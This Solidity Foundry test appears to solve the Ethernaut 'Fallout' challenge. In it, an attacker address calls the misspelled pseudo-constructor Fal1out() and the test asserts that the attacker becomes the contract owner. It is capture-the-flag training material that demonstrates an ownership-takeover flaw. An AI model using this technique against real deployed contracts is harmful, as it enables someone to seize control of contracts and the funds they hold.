// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Fallout} from "../src/Fallout.sol";

contract FalloutTest is Test {
    Fallout fo;
    address owner;
    address attacker;

    function setUp() public {
        fo = new Fallout();
        owner = address(this);
        attacker = address(0x123);
    }

    function testFal1out() public {
        vm.startPrank(attacker);
        fo.Fal1out();
        assertEq(attacker, fo.owner());
        vm.stopPrank();
    }

}

